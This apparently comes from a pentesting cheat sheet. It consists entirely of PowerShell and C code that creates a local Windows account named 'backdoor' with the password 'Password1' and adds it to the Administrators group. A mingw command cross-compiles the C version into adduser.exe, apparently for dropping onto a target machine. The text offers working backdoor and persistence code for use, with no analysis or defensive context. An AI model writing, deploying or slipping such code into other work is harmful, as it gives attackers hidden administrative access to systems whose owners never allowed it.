# Powershell
```powershell
# Create the new user
$Username = "backdoor"
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -FullName "Backdoor User" -Description "User with administrative privileges" -PasswordNeverExpires -UserMayNotChangePassword

# Add the user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username
```

# C code 
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user backdoor Password1 /add");
  i = system ("net localgroup administrators backdoor /add");
  
  return 0;
}
```
Compile using gcc
```shell
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
